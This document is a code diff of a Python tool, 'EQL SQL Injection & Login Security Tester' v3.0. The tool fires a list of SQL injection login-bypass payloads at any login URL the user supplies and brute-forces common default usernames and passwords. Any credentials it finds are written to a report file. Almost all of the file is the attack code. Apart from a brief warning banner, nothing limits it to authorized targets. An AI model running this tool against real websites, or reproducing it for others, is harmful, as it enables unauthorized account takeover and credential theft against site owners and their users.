@@ -8,23 +8,21 @@ from datetime import datetime
 
 print("""
 ╔═══════════════════════════════════════════════════════════╗
-║  EQL - SQL INJECTION & LOGIN SECURITY TESTER v2.0        ║
-║  Purpose: Test website login security & SQL injection    ║
-║  Developer: Security Research Tool                       ║
+║  EQL - SQL INJECTION & LOGIN SECURITY TESTER v3.0        ║
+║  Developer: @ERROR0101risback                            ║
 ║  Warning: Unauthorized testing is illegal                ║
 ╚═══════════════════════════════════════════════════════════╝
 """)
 
-response = input("Accept terms? (yes/no): ")
-if response.lower() != 'yes':
+resp = input("Accept terms? (yes/no): ")
+if resp.lower() != 'yes':
     print("Exiting...")
     sys.exit(0)
 
 class EQL:
     def __init__(self):
-        self.vulnerabilities = []
-        self.valid_creds = []
-        self.success_keywords = []
+        self.vulns = []
+        self.creds = []
         self.failure_keywords = []
         self.payloads = [
             "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1' /*", "' OR 1=1 --",
@@ -42,169 +40,136 @@ class EQL:
             "1' OR 1=1#", "1' OR 1=1/*", "' OR 1=1 ORDER BY 1--", "' OR 1=1 ORDER BY 2--"
         ]
 
-    def get_failure_message(self):
+    def get_keywords(self):
         print("\n" + "="*60)
         print("LOGIN RESPONSE DETECTION SETUP")
         print("="*60)
-        print("\nTo accurately detect successful and failed logins,")
-        print("enter keywords that appear on the login page when:")
-        print("- Login FAILS (wrong password)")
-        print("- Login SUCCESS (logged in)\n")
-        
-        print("Enter failure keywords (text that appears when login fails)")
-        print("Example: 'Invalid password', 'Login failed', 'Incorrect'")
-        failure_input = input("Failure keywords (comma separated): ")
-        self.failure_keywords = [k.strip().lower() for k in failure_input.split(',') if k.strip()]
-        
-        print("\nEnter success keywords (text that appears when login succeeds)")
-        print("Example: 'Dashboard', 'Welcome', 'Logout', 'Admin panel'")
-        success_input = input("Success keywords (comma separated): ")
-        self.success_keywords = [k.strip().lower() for k in success_input.split(',') if k.strip()]
+        print("\nEnter keywords that appear when login FAILS:")
+        print("(If these keywords are NOT found on page, login will be considered SUCCESSFUL)")
+        fail = input("Failure keywords (comma separated): ")
+        self.failure_keywords = [k.strip().lower() for k in fail.split(',') if k.strip()]
         
         if not self.failure_keywords:
             self.failure_keywords = ["invalid", "incorrect", "failed", "error"]
-            print(f"\n[!] Using default failure keywords: {self.failure_keywords}")
-        
-        if not self.success_keywords:
-            self.success_keywords = ["dashboard", "welcome", "logout", "admin"]
-            print(f"[!] Using default success keywords: {self.success_keywords}")
+            print(f"[!] Using default failure keywords: {self.failure_keywords}")
 
-    def create_preset_usernames(self):
+    def preset_usernames(self):
         return ["admin", "Administrator", "root", "user", "test", "guest", "admin1", 
                 "webadmin", "sysadmin", "manager", "support", "info", "contact", 
                 "webmaster", "operator", "superuser", "supervisor", "owner", "master"]
 
-    def create_preset_passwords(self):
+    def preset_passwords(self):
         return ["admin", "password", "123456", "12345678", "1234", "qwerty", "abc123", 
                 "admin123", "root", "letmein", "welcome", "passw0rd", "password123", 
                 "admin@123", "admin#123", "123456789", "12345", "111111", "adminadmin"]
 
-    def get_wordlist(self, wordlist_type):
-        print(f"\n--- {wordlist_type} List ---")
+    def get_wordlist(self, wtype):
+        print(f"\n--- {wtype} List ---")
         print("1. Use preset list")
         print("2. Use custom file path")
-        choice = input("Select (1/2): ")
-        
-        if choice == '2':
-            path = input(f"Enter path to {wordlist_type.lower()} file: ")
+        ch = input("Select (1/2): ")
+        if ch == '2':
+            path = input(f"Enter path to {wtype.lower()} file: ")
             if os.path.exists(path):
                 with open(path, 'r') as f:
                     return [line.strip() for line in f if line.strip()]
-        if wordlist_type == "Username":
-            return self.create_preset_usernames()
+        if wtype == "Username":
+            return self.preset_usernames()
         else:
-            return self.create_preset_passwords()
+            return self.preset_passwords()
 
-    def test_login(self, url, username, password, user_field, pass_field, submit_field):
+    def test_login(self, url, user, pwd, uf, pf, sf):
         try:
-            data = {user_field: username, pass_field: password, submit_field: "Login"}
+            data = {uf: user, pf: pwd, sf: "Login"}
             start = time.time()
-            response = requests.post(url, data=data, timeout=10, allow_redirects=True)
+            r = requests.post(url, data=data, timeout=10, allow_redirects=True)
             elapsed = time.time() - start
+            content = r.text.lower()
+            final_url = r.url.lower()
             
-            content = response.text.lower()
-            final_url = response.url.lower()
-            
-            if any(keyword in content or keyword in final_url for keyword in self.success_keywords):
-                return True, elapsed, "Success keyword matched"
-            
-            if any(keyword in content or keyword in final_url for keyword in self.failure_keywords):
-                return False, elapsed, "Failure keyword matched"
-            
-            if response.status_code == 302 and "login" not in final_url:
+            if r.status_code == 302 and "login" not in final_url:
                 return True, elapsed, "Redirect detected"
             
             if elapsed > 4:
                 return True, elapsed, "Time delay detected"
             
-            if "login" not in final_url and len(content) > 500:
-                return True, elapsed, "Content length changed"
+            for kw in self.failure_keywords:
+                if kw in content or kw in final_url:
+                    return False, elapsed, f"Failure keyword found: {kw}"
             
-            return False, elapsed, "No clear indicator"
+            return True, elapsed, "No failure message found"
             
         except Exception as e:
-            return False, 0, f"Error: {str(e)}"
+            return False, 0, f"Connection error: {str(e)[:30]}"
 
-    def sql_injection_test(self, url, user_field, pass_field, submit_field):
+    def sql_test(self, url, uf, pf, sf):
         print("\n" + "="*60)
-        print("SQL INJECTION TESTING IN PROGRESS")
+        print("SQL INJECTION TESTING")
         print("="*60)
-        
-        for i, payload in enumerate(self.payloads, 1):
-            print(f"[{i}/{len(self.payloads)}] Testing: {payload[:40]}...")
-            success, elapsed, msg = self.test_login(url, payload, "x", user_field, pass_field, submit_field)
+        for i, p in enumerate(self.payloads, 1):
+            print(f"[{i}/{len(self.payloads)}] Testing: {p[:40]}...")
+            success, elapsed, msg = self.test_login(url, p, "x", uf, pf, sf)
             if success:
-                print(f"    [!] VULNERABLE! {msg} (Time: {elapsed:.2f}s)")
-                self.vulnerabilities.append({"payload": payload, "response": msg, "time": f"{elapsed:.2f}s"})
+                print(f"    [!] VULNERABLE! {msg} ({elapsed:.2f}s)")
+                self.vulns.append({"payload": p, "response": msg, "time": f"{elapsed:.2f}s"})
             else:
                 print(f"    [.] Not vulnerable - {msg}")
             time.sleep(0.3)
-        return self.vulnerabilities
+        return self.vulns
 
-    def brute_force_test(self, url, user_field, pass_field, submit_field, usernames, passwords):
+    def brute_test(self, url, uf, pf, sf, users, passes):
         print("\n" + "="*60)
-        print("BRUTE FORCE TESTING IN PROGRESS")
+        print("BRUTE FORCE TESTING")
         print("="*60)
-        
-        total = len(usernames) * len(passwords)
-        current = 0
-        
-        for username in usernames:
-            for password in passwords:
-                current += 1
-                print(f"[{current}/{total}] Testing: {username}:{password}")
-                success, elapsed, msg = self.test_login(url, username, password, user_field, pass_field, submit_field)
+        total = len(users) * len(passes)
+        curr = 0
+        for user in users:
+            for pwd in passes:
+                curr += 1
+                print(f"[{curr}/{total}] Testing: {user}:{pwd}")
+                success, elapsed, msg = self.test_login(url, user, pwd, uf, pf, sf)
                 if success:
-                    print(f"    [!!!] FOUND! {username}:{password} - {msg}")
-                    self.valid_creds.append({"username": username, "password": password, "response": msg})
+                    print(f"    [!!!] FOUND! {user}:{pwd} - {msg}")
+                    self.creds.append({"username": user, "password": pwd, "response": msg})
                 time.sleep(0.2)
-        return self.valid_creds
+        return self.creds
 
     def save_report(self):
-        filename = "scan.txt"
-        with open(filename, 'w') as f:
+        with open("scan.txt", 'w') as f:
             f.write("="*80 + "\n")
             f.write(f"EQL SCAN REPORT - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write("="*80 + "\n\n")
-            
-            f.write("DETECTION KEYWORDS USED:\n")
-            f.write("-"*60 + "\n")
-            f.write(f"Success Keywords: {', '.join(self.success_keywords)}\n")
-            f.write(f"Failure Keywords: {', '.join(self.failure_keywords)}\n\n")
-            
+            f.write(f"Failure Keywords: {', '.join(self.failure_keywords)}\n")
+            f.write("Detection Logic: If failure keywords NOT found → SUCCESS\n\n")
             f.write("SQL INJECTION VULNERABILITIES:\n")
             f.write("-"*60 + "\n")
-            if self.vulnerabilities:
-                for v in self.vulnerabilities:
+            if self.vulns:
+                for v in self.vulns:
                     f.write(f"Payload: {v['payload']}\n")
                     f.write(f"Indicator: {v['response']}\n")
                     f.write(f"Time: {v['time']}\n\n")
             else:
-                f.write("No SQL injection vulnerabilities detected.\n\n")
-            
-            f.write("VALID CREDENTIALS FOUND:\n")
+                f.write("None found.\n\n")
+            f.write("VALID CREDENTIALS:\n")
             f.write("-"*60 + "\n")
-            if self.valid_creds:
-                for c in self.valid_creds:
+            if self.creds:
+                for c in self.creds:
                     f.write(f"Username: {c['username']}\n")
                     f.write(f"Password: {c['password']}\n")
                     f.write(f"Response: {c['response']}\n\n")
             else:
-                f.write("No valid credentials found.\n\n")
-            
+                f.write("None found.\n\n")
             f.write("="*80 + "\n")
-            f.write("End of Report\n")
-        
-        print(f"\n[+] Report saved to {filename}")
+        print(f"\n[+] Report saved to scan.txt")
 
     def run(self):
         print("\n[+] Enter target information")
         url = input("Login URL: ")
-        user_field = input("Username field name: ")
-        pass_field = input("Password field name: ")
-        submit_field = input("Submit button name: ")
+        uf = input("Username field name: ")
+        pf = input("Password field name: ")
+        sf = input("Submit button name: ")
         
-        self.get_failure_message()
+        self.get_keywords()
         
         print("\n[+] Select testing mode")
         print("1. SQL Injection Only")
@@ -212,27 +177,26 @@ class EQL:
         print("3. Full Test (Both)")
         mode = input("Mode (1/2/3): ")
         
-        usernames = []
-        passwords = []
-        
+        users = []
+        passes = []
         if mode in ['2', '3']:
-            usernames = self.get_wordlist("Username")
-            passwords = self.get_wordlist("Password")
-            print(f"[+] Loaded {len(usernames)} usernames, {len(passwords)} passwords")
+            users = self.get_wordlist("Username")
+            passes = self.get_wordlist("Password")
+            print(f"[+] Loaded {len(users)} usernames, {len(passes)} passwords")
         
         if mode in ['1', '3']:
-            self.sql_injection_test(url, user_field, pass_field, submit_field)
+            self.sql_test(url, uf, pf, sf)
         
         if mode in ['2', '3']:
-            self.brute_force_test(url, user_field, pass_field, submit_field, usernames, passwords)
+            self.brute_test(url, uf, pf, sf, users, passes)
         
         self.save_report()
         
         print("\n" + "="*60)
         print("SCAN COMPLETE")
         print("="*60)
-        print(f"SQL Injection Findings: {len(self.vulnerabilities)}")
-        print(f"Valid Credentials Found: {len(self.valid_creds)}")
+        print(f"SQL Injection Findings: {len(self.vulns)}")
+        print(f"Valid Credentials Found: {len(self.creds)}")
         print("="*60)
 
 if __name__ == "__main__":
@@ -240,7 +204,7 @@ if __name__ == "__main__":
         tool = EQL()
         tool.run()
     except KeyboardInterrupt:
-        print("\n[!] Scan interrupted")
+        print("\n[!] Interrupted")
         sys.exit(0)
     except Exception as e:
         print(f"\n[!] Error: {e}")
